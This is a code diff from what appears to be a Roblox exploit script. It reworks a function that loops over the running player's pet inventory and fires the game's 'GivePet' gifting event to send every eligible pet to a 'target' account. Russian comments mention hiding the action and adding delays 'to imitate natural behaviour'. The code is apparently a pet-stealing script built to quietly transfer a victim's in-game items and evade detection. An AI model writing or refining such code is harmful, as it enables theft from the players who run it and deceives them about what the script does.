@@ -573,35 +573,39 @@ end
         end
 
         local function checkPetsInventory(target)
-            for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-                local petName = value.PetType
-                local petData = value.PetData or {}
-                if not petData then
-                    print("No PetData for pet:", petName, petUid)
-                    continue
-                end
-                if not isPetValid(petData, petName) then
-                    print("➡️ Skipped pet:", petName, "Not eligible")
-                    continue
-                end
-                print("➡️ Attempting to give pet:", petName, petUid, "to", target)
-                local petObject = getPetObject(petUid)
-                if not petObject then
-                    warn("❌ Failed to find pet object:", petName, petUid)
-                    continue
-                end
-                equipPet(petObject)
-                local success, err = pcall(function()
-                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", game.Players[target], petUid)
-                end)
-                if success then
-                    print("✅ Successfully attempted to give pet:", petName, petUid)
-                else
-                    warn("❌ Failed to give pet:", petName, petUid, err)
-                end
-                task.wait(0.25)
-            end
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        local petData = value.PetData or {}
+        if not petData then
+            print("No PetData for pet:", petName, petUid)
+            continue
         end
+        if not isPetValid(petData, petName) then
+            print("➡️ Skipped pet:", petName, "Not eligible")
+            continue
+        end
+        print("➡️ Attempting to give pet:", petName, petUid, "to", target)
+        local petObject = getPetObject(petUid)
+        if not petObject then
+            warn("❌ Failed to find pet object:", petName, petUid)
+            continue
+        end
+        -- Экипируем питомца (с учётом скрытия)
+        if equipPet(petObject) then
+            local success, err = pcall(function()
+                ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", game.Players[target], petUid)
+            end)
+            if success then
+                print("✅ Successfully attempted to give pet:", petName, petUid)
+            else
+                warn("❌ Failed to give pet:", petName, petUid, err)
+            end
+        else
+            warn("❌ Failed to equip pet, skipping give:", petName, petUid)
+        end
+        task.wait(0.25) -- Задержка для имитации естественного поведения
+    end
+end
 
         local function idlingTarget()
             task.spawn(function()
